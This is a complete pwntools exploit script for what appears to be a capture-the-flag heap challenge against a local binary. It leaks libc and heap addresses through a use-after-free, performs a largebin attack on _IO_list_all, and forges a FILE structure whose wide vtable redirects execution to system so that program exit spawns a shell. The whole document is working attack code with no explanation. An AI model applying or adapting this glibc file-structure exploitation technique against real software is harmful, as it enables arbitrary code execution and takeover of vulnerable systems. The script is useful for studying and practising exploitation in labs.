from pwn import *
context(log_level='debug',os='linux',arch='amd64')
fn='./pwn'
libc=ELF('./libc.so.6')

p=process(fn)
elf=ELF(fn)

def open_gdb_terminal():
    pid = p.pid
    gdb_cmd = f"gdb -ex 'attach {pid}' -ex 'set height 0' -ex 'set width 0'"
    subprocess.Popen(["gnome-terminal", "--geometry=120x64+0+0", "--", "bash", "-c", f"{gdb_cmd}; exec bash"])

def dbg():
    open_gdb_terminal()
    pause()


sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ita = lambda : p.interactive()
l64 = lambda : u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
ll64 = lambda s : u64(p.recv(s).ljust(8,b'\x00'))
pt = lambda s : print("leak----->",hex(s))

def menu(choice):
    sla("Your choice:\n",str(choice))
def add(index,size):
    menu(1)
    sla("index:\n",str(index))
    sla("Size:\n",str(size))
def dele(index):
    menu(2)
    sla("index:\n",str(index))

def edit(index,size,content):
    menu(3)
    sla("index:\n",str(index))
    sla("size:\n",str(size))
    sa("context: \n",content)

def show(index):
    menu(4)
    sla("index:\n",str(index))

def ex1t():
    menu(5)



ogs=[0xebc81,0xebc85,0xebc88,0xebce2]
add(0,0x440)
add(1,0x10)
add(2,0x430)
add(3,0x10)
dele(0)
add(4,0x460)
show(0)
p.recv(10)
libc_base=u64(p.recv(6).ljust(8,b'\x00'))-0x21b0e0
print("libc_base----->",hex(libc_base))
IO_list_all=libc_base+libc.sym['_IO_list_all']
system=libc_base+libc.sym['system']
_IO_stdfile_2_lock=libc_base+0x21ca60
og=libc_base+ogs[0]
edit(0,0x100,b'a'*0x10)
show(0)
ru(b'a'*0x10)
heap_base=ll64(6)-0x290
print("heap_base----->",hex(heap_base))
edit(0,0x100,p64(libc_base+0x21b0e0)*2)
dele(2)
edit(0,0x100,p64(0)*3+p64(IO_list_all-0x20))
add(5,0x470)
file_addr=heap_base+0x700
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(0) * 4  # from _IO_save_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # fake vtable
fake_io += p64(wide_vtable_addr)
fake_io += p64(system)
edit(2,0x100,fake_io)
edit(1,0x20,p64(0)*2+b' sh;')

ex1t()
#dbg()

ita()